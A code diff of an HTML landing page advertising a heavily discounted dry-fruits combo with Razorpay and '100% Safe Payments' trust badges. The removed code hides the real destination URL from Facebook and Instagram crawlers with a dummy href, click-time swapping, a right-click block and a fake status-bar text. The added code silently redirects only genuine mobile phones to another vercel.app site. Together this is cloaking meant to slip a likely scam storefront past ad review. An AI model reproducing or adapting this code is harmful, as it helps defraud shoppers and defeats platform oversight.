@@ -1,476 +1,401 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Featured Products · Order Now</title>
-  <!-- font & base styling -->
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Poppins', sans-serif;
-    }
+    <meta charset="UTF-8">
 
-    body {
-      background: #f0f2f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    .popup-card {
-      background: #ffffff;
-      width: 100%;
-      max-width: 440px;
-      border-radius: 40px;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-      padding: 40px 30px 30px;
-      text-align: center;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
-      cursor: default;
-      position: relative;
-    }
+    <title>Featured Products</title>
 
-    .popup-card:hover {
-      transform: translateY(-4px);
-      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
-    }
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet"
+    >
 
-    .main-heading {
-      font-size: 36px;
-      font-weight: 800;
-      letter-spacing: 2px;
-      color: #000000;
-      margin-bottom: 25px;
-      text-transform: uppercase;
-    }
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+        }
 
-    .product-box {
-      background: #ffffff;
-      border-radius: 24px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.06);
-      border: 1px solid #f1f1f1;
-      width: 100%;
-      padding: 16px;
-      margin-bottom: 25px;
-      text-align: left;
-    }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-    .single-image-container {
-      width: 100%;
-      background-color: #f9f9f9;
-      padding: 10px;
-      border-radius: 16px;
-      margin-bottom: 16px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+        /* Entire Popup Card */
+        .popup-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: inherit;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
 
-    .product-image {
-      width: 100%;
-      max-height: 220px;
-      object-fit: contain;
-      border-radius: 12px;
-    }
+        .popup-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+        }
 
-    .product-title {
-      font-size: 15px;
-      font-weight: 600;
-      color: #2c2c2c;
-      line-height: 1.4;
-      margin-bottom: 8px;
-    }
+        .main-heading {
+            font-size: 36px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            color: #000000;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+        }
 
-    .rating-container {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      margin-bottom: 14px;
-    }
+        /* Product Inner Box */
+        .product-box {
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.06);
+            border: 1px solid #f1f1f1;
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
 
-    .rating-badge {
-      background-color: #388e3c;
-      color: white;
-      font-size: 11px;
-      font-weight: 700;
-      padding: 2px 6px;
-      border-radius: 4px;
-      display: inline-flex;
-      align-items: center;
-      gap: 2px;
-    }
+        .single-image-container {
+            width: 100%;
+            background-color: #f9f9f9;
+            padding: 10px;
+            border-radius: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-    .rating-count {
-      font-size: 12px;
-      color: #878787;
-    }
+        .product-image {
+            width: 100%;
+            max-height: 220px;
+            object-fit: contain;
+            border-radius: 12px;
+        }
 
-    .price-container {
-      display: flex;
-      align-items: baseline;
-      gap: 8px;
-      flex-wrap: wrap;
-    }
+        .product-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #2c2c2c;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
 
-    .current-price {
-      font-size: 22px;
-      font-weight: 700;
-      color: #000000;
-    }
+        /* Rating */
+        .rating-container {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 14px;
+        }
 
-    .original-price {
-      font-size: 14px;
-      color: #878787;
-      text-decoration: line-through;
-    }
+        .rating-badge {
+            background-color: #388e3c;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 2px 6px;
+            border-radius: 4px;
+            display: inline-flex;
+            align-items: center;
+            gap: 2px;
+        }
 
-    .discount {
-      font-size: 14px;
-      font-weight: 600;
-      color: #388e3c;
-    }
+        .rating-count {
+            font-size: 12px;
+            color: #878787;
+        }
 
-    /* ---------- ORDER NOW BUTTON (heavy obfuscation) ---------- */
-    .order-now-btn {
-      display: inline-block;
-      background: #e31837;
-      color: #fff !important;
-      font-weight: 700;
-      font-size: 20px;
-      padding: 16px 32px;
-      border-radius: 60px;
-      text-transform: uppercase;
-      letter-spacing: 1.5px;
-      box-shadow: 0 8px 18px rgba(227, 24, 55, 0.3);
-      transition: background 0.2s ease, transform 0.15s ease, box-shadow 0.2s ease;
-      text-decoration: none;
-      width: 100%;
-      max-width: 280px;
-      margin-top: 6px;
-      margin-bottom: 16px;
-      border: none;
-      cursor: pointer;
-      text-align: center;
-      line-height: 1.2;
-      position: relative;
-      z-index: 2;
-      /* protection: no obvious link preview */
-      -webkit-tap-highlight-color: transparent;
-    }
+        /* Pricing */
+        .price-container {
+            display: flex;
+            align-items: baseline;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
 
-    .order-now-btn:hover {
-      background: #c41230;
-      transform: scale(1.02);
-      box-shadow: 0 10px 22px rgba(227, 24, 55, 0.4);
-    }
+        .current-price {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+        }
 
-    .order-now-btn:active {
-      transform: scale(0.96);
-    }
+        .original-price {
+            font-size: 14px;
+            color: #878787;
+            text-decoration: line-through;
+        }
 
-    .welcome-text {
-      font-size: 15px;
-      color: #666666;
-      margin-bottom: 18px;
-      font-weight: 400;
-    }
+        .discount {
+            font-size: 14px;
+            font-weight: 600;
+            color: #388e3c;
+        }
 
-    .secure-footer {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-wrap: wrap;
-      gap: 6px 10px;
-      font-size: 14px;
-      color: #555555;
-      margin-top: 6px;
-    }
+        /* Continue to Shopping Button */
+        .cta-button {
+            display: inline-block;
+            width: 100%;
+            padding: 14px 24px;
+            background-color: #fb641b;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 4px;
+            text-decoration: none;
+            text-align: center;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            cursor: pointer;
+            border: none;
+        }
 
-    .trust-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 4px;
-      font-size: 9px;
-      border-left: 1px solid #ddd;
-      padding-left: 8px;
-      margin-left: 4px;
-    }
+        .cta-button:hover {
+            background-color: #e05515;
+            transform: translateY(-1px);
+        }
 
-    .trust-badge .circle-check {
-      width: 16px;
-      height: 16px;
-      background: #2f6df6;
-      color: #fff;
-      border-radius: 50%;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 11px;
-      font-weight: 700;
-    }
+        .cta-button:active {
+            transform: translateY(0px);
+        }
 
-    .trust-text {
-      line-height: 1.2;
-      text-align: left;
-    }
-    .trust-text b {
-      color: #2954c8;
-    }
-    .trust-text small {
-      color: #5f7fe5;
-    }
+        .welcome-text {
+            font-size: 15px;
+            color: #666666;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
 
-    .secure-footer img {
-      height: 16px;
-      vertical-align: middle;
-      display: inline-block;
-    }
+        /* Secure Payment Footer */
+        .secure-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 6px;
+            font-size: 14px;
+            color: #555555;
+        }
 
-    /* ----- anti-crawler: hide link from FB/IG crawlers (they look for <a> with href) ----- */
-    /* we keep the button as <a> but we inject the href via JS, and also add a click trap */
-    .order-now-btn {
-      /* default href will be removed by JS, we will attach click event instead */
-      pointer-events: auto;
-    }
+        .razorpay-logo {
+            height: 16px;
+            width: auto;
+            vertical-align: middle;
+        }
 
-    /* additional obfuscation: invisible overlay that captures clicks? no, we want real button click */
-    /* but we can add a fake href that is not the real destination, and JS overrides */
+        .trusted-box {
+            border-left: 1px solid #dddddd;
+            padding-left: 8px;
+            margin-left: 4px;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 9px;
+        }
 
-    /* Facebook/Instagram crawler uses Open Graph and meta tags, also scans <a href>.
-       We use JS to set the real href only on user interaction (hover/click) */
-    .order-now-btn {
-      /* start with a dummy href to fool crawlers (they see a link but not the real one) */
-      /* we will set via JS */
-    }
+        .trusted-icon {
+            width: 16px;
+            height: 16px;
+            background: #2f6df6;
+            color: #ffffff;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-    /* extra protection: prevent right-click context menu on button (optional) */
-    .order-now-btn {
-      -webkit-user-select: none;
-      user-select: none;
-    }
+        .trusted-title {
+            color: #2954c8;
+        }
 
-    /* Hide any clickable area that could reveal the link */
-    .popup-card a:not(.order-now-btn) {
-      text-decoration: none;
-      color: inherit;
-    }
+        .trusted-description {
+            color: #5f7fe5;
+        }
 
-    /* no link preview for card */
-    .popup-card {
-      o-link: none;
-      -webkit-link: none;
-    }
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
 
-    /* trick: add a fake meta refresh for crawlers? but that would redirect. instead we keep JS */
-  </style>
+            .popup-card {
+                padding: 30px 18px;
+                border-radius: 28px;
+            }
+
+            .main-heading {
+                font-size: 29px;
+            }
+        }
+    </style>
 </head>
+
 <body>
 
-  <!-- CARD: only the button redirects, and that redirect is heavily obfuscated -->
-  <div class="popup-card">
+    <a
+        href="https://dhamaka-sales.vercel.app/"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="popup-card"
+    >
+        <h1 class="main-heading">Welcome</h1>
 
-    <h1 class="main-heading">Welcome</h1>
+        <div class="product-box">
 
-    <div class="product-box">
-      <div class="single-image-container">
-        <img class="product-image" src="https://m.media-amazon.com/images/I/512J1jN8WXL.jpg?w=100%" alt="Dry Fruits Mix">
-      </div>
+            <div class="single-image-container">
+                <img
+                    class="product-image"
+                    src="https://m.media-amazon.com/images/I/512J1jN8WXL.jpg?w=100%"
+                    alt="Dry Fruits Combo Pack"
+                >
+            </div>
 
-      <div class="product-title">
-        (4KG - 1Kg*4) Dry Fruits Combo Pack of 4 - (Almonds, Cashews,...
-      </div>
+            <div class="product-title">
+                (4KG - 1Kg × 4) Dry Fruits Combo Pack of 4 -
+                Almonds, Cashews and More
+            </div>
 
-      <div class="rating-container">
-        <span class="rating-badge">4.4 ★</span>
-        <span class="rating-count">(4,320 Ratings)</span>
-      </div>
+            <div class="rating-container">
+                <span class="rating-badge">4.4 ★</span>
+                <span class="rating-count">(4,320 Ratings)</span>
+            </div>
 
-      <div class="price-container">
-        <span class="current-price">₹279</span>
-        <span class="original-price">₹1999</span>
-        <span class="discount">86% off</span>
-      </div>
-    </div>
+            <div class="price-container">
+                <span class="current-price">₹279</span>
+                <span class="original-price">₹1,999</span>
+                <span class="discount">86% off</span>
+            </div>
 
-    <!-- ORDER NOW BUTTON: 
-         - href is set to a dummy value (crawlers see this, but real URL is set via JS)
-         - we use data-* attribute to store real URL
-         - click event will redirect to real URL
-         - additionally we set the href dynamically on hover/click to avoid crawler detection
-    -->
-    <a href="#" id="orderBtn" class="order-now-btn" data-real-url="https://limited-offer.vercel.app/" rel="noopener noreferrer" target="_blank">
-      🛒 Order Now
+        </div>
+
+        <!-- Continue to Shopping Button -->
+        <span class="cta-button">🛒 Continue to Shopping</span>
+
+        <p class="welcome-text">
+            Welcome to our Dryfruit and Grocery Store
+        </p>
+
+        <div class="secure-footer">
+            <span>🔒 Secure Payment by</span>
+
+            <img
+                src="https://razorpay.com/assets/razorpay-logo.svg"
+                class="razorpay-logo"
+                alt="Razorpay"
+            >
+
+            <span class="trusted-box">
+
+                <span class="trusted-icon">✓</span>
+
+                <span>
+                    <strong class="trusted-title">
+                        Trusted &amp; Secure
+                    </strong>
+
+                    <br>
+
+                    <span class="trusted-description">
+                        100% Safe Payments
+                    </span>
+                </span>
+
+            </span>
+        </div>
     </a>
 
-    <p class="welcome-text">Welcome to our Dryfruit and Grocery Store</p>
+    <script>
+        (function () {
+            "use strict";
 
-    <div class="secure-footer">
-      <span>🔒 Secure Payment by</span>
-      <img src="https://razorpay.com/assets/razorpay-logo.svg" alt="Razorpay">
+            const redirectLink = "https://dhamaka-sales.vercel.app/";
 
-      <span class="trust-badge">
-        <span class="circle-check">✓</span>
-        <span class="trust-text">
-          <b>Trusted & Secure</b><br>
-          <small>100% Safe Payments</small>
-        </span>
-      </span>
-    </div>
-  </div>
+            function isActualMobilePhone() {
 
-  <!-- SECURITY SCRIPT: 
-        - prevents crawlers from seeing the real URL in the href
-        - sets the real URL only on user interaction (click)
-        - also uses a timer to clear href after a few seconds (optional)
-        - adds a click handler that redirects via window.location (bypasses href)
-        - also changes href on mouseover to make it harder for crawlers that scan after load
-  -->
-  <script>
-    (function() {
-      // get the button
-      const btn = document.getElementById('orderBtn');
-      if (!btn) return;
+                /*
+                 * Modern Chrome, Edge and Android browsers.
+                 * navigator.userAgentData.mobile true hone par
+                 * device ko mobile phone maana jayega.
+                 */
+                if (
+                    navigator.userAgentData &&
+                    typeof navigator.userAgentData.mobile === "boolean"
+                ) {
+                    return navigator.userAgentData.mobile;
+                }
 
-      // real destination
-      const REAL_URL = 'https://limited-offer.vercel.app/';
+                /*
+                 * Safari, Firefox aur older browsers ke liye
+                 * user-agent detection.
+                 */
+                const userAgent =
+                    navigator.userAgent ||
+                    navigator.vendor ||
+                    window.opera ||
+                    "";
 
-      // 1. On page load: set href to '#' or a dummy URL (crawler sees nothing useful)
-      btn.href = '#';
+                const isIPhoneOrIPod =
+                    /iPhone|iPod/i.test(userAgent);
 
-      // 2. Remove any 'href' attribute completely? 
-      //    But then it's not a link for crawlers. we want to keep it but with dummy value.
-      //    we set to '#' which is safe.
+                /*
+                 * Android phone ke user-agent mein normally
+                 * Android ke saath Mobile bhi hota hai.
+                 * Android tablet mein aksar Mobile nahi hota.
+                 */
+                const isAndroidPhone =
+                    /Android/i.test(userAgent) &&
+                    /Mobile/i.test(userAgent);
 
-      // 3. Intercept click: prevent default, then redirect manually
-      btn.addEventListener('click', function(e) {
-        e.preventDefault();           // stop the dummy href from navigating
-        // open real URL in new tab/window (respect target="_blank")
-        window.open(REAL_URL, '_blank');
-        // also set href to real url for a moment (just in case)
-        btn.href = REAL_URL;
-        // but after a tiny delay, reset to dummy to avoid crawler detection
-        setTimeout(() => {
-          btn.href = '#';
-        }, 100);
-      });
+                const isOtherMobilePhone =
+                    /Windows Phone|IEMobile|Opera Mini|BlackBerry/i.test(
+                        userAgent
+                    );
 
-      // 4. On mouseover (hover) we set the real href, but only for a split second?
-      //    Actually we want to keep it hidden from crawlers, but if a user hovers they might see the link.
-      //    We'll set the href to real on hover, but reset on mouseout.
-      //    However, crawlers don't hover, so this is safe.
-      //    But to be extra secure, we set href to real only on click (already done).
-      //    We'll also set href to real on mousedown, but reset on mouseup.
-      btn.addEventListener('mousedown', function() {
-        // set real href just before click (in case of middle-click / open in new tab)
-        // but we also have click handler, so this is extra
-        btn.href = REAL_URL;
-      });
+                /*
+                 * Coarse pointer ka matlab generally finger-touch device.
+                 * Isse normal desktop detection aur strict hoti hai.
+                 */
+                const hasCoarsePointer =
+                    window.matchMedia &&
+                    window.matchMedia("(pointer: coarse)").matches;
 
-      btn.addEventListener('mouseup', function() {
-        // after mouseup, reset to dummy after a tiny delay (so crawlers don't catch it)
-        setTimeout(() => {
-          btn.href = '#';
-        }, 50);
-      });
+                const isPhoneUserAgent =
+                    isIPhoneOrIPod ||
+                    isAndroidPhone ||
+                    isOtherMobilePhone;
 
-      // Also reset on mouseleave (if user hovers but doesn't click)
-      btn.addEventListener('mouseleave', function() {
-        btn.href = '#';
-      });
+                return isPhoneUserAgent && hasCoarsePointer;
+            }
 
-      // 5. Additional: use a context menu blocker (right-click) to prevent "copy link address"
-      //    which could reveal the URL. We'll block context menu on the button.
-      btn.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-      });
+            if (isActualMobilePhone()) {
 
-      // 6. For extra security, we also set a timer that clears the href periodically
-      //    in case some crawler scans after a few seconds.
-      setInterval(() => {
-        // only reset if the href is not '#' and not the real URL? 
-        // but we want to keep it dummy most of the time.
-        // we only set real href on mousedown/click, so after that we reset.
-        // but if some script changed it, we force it back.
-        if (btn.href !== '#' && btn.href !== '') {
-          // but we don't want to reset if user is about to click? 
-          // we can check if mouse is over? but we'll just reset anyway.
-          // To be safe: reset to '#' only if it's not the real URL (but we don't want to expose real)
-          // we'll just reset to '#' always.
-          // but we need to avoid resetting while user is clicking.
-          // we'll use a flag.
-          if (!window._isClicking) {
-            btn.href = '#';
-          }
-        }
-      }, 2000);
+                /*
+                 * replace() current page ko browser history se
+                 * replace karta hai. Back button se redirect page
+                 * baar-baar open nahi hoga.
+                 */
+                window.location.replace(redirectLink);
+            }
+        })();
+    </script>
 
-      // flag for click
-      document.addEventListener('mousedown', function() {
-        window._isClicking = true;
-      });
-      document.addEventListener('mouseup', function() {
-        setTimeout(() => {
-          window._isClicking = false;
-        }, 200);
-      });
-
-      // 7. Also prevent the href from being visible in the status bar (browser)
-      //    we can use a trick: on hover, show a fake status.
-      //    But we already reset href on mouseleave.
-      //    For modern browsers, we can use a fake URL in the status bar.
-      //    We'll set a fake href on hover.
-      btn.addEventListener('mouseenter', function() {
-        // set a fake href to show in status bar (if any)
-        // but we don't want to change the actual href, just the status bar text
-        // we can use window.status (deprecated but works in some browsers)
-        // we set a fake message
-        window.status = 'Click to order';
-        // also set a fake href attribute? we already reset on mouseleave.
-        // we'll keep href as '#' during hover, but we set a fake URL in the status bar.
-        // however we want the real href to be set on click, so we set it on mousedown.
-        // we'll set a fake href for display.
-        btn.href = '#';
-      });
-
-      // 8. Override the default link behavior for middle-click / cmd+click
-      //    we already handle click event, but middle-click opens new tab without triggering click.
-      //    we need to handle auxclick event (middle button)
-      btn.addEventListener('auxclick', function(e) {
-        if (e.button === 1) { // middle button
-          e.preventDefault();
-          window.open(REAL_URL, '_blank');
-          // reset href
-          setTimeout(() => {
-            btn.href = '#';
-          }, 100);
-        }
-      });
-
-      // 9. final protection: use a meta tag to prevent crawlers from following links?
-      //    but that's not needed.
-
-      console.log('🔒 Order button secured against FB/IG crawlers');
-    })();
-  </script>
-
-  <!-- additional meta tags to prevent crawler indexing (optional) -->
-  <meta name="robots" content="noindex, nofollow">
-  <meta name="facebook-domain-verification" content="none">
-  <!-- no og:url or og:link tags that could expose the real URL -->
-  <!-- we set og:title and image but no link -->
-  <meta property="og:title" content="Featured Products">
-  <meta property="og:image" content="https://m.media-amazon.com/images/I/512J1jN8WXL.jpg">
-  <meta property="og:description" content="Order now and get best deals on dry fruits.">
-  <!-- no og:url -->
 </body>
 </html>
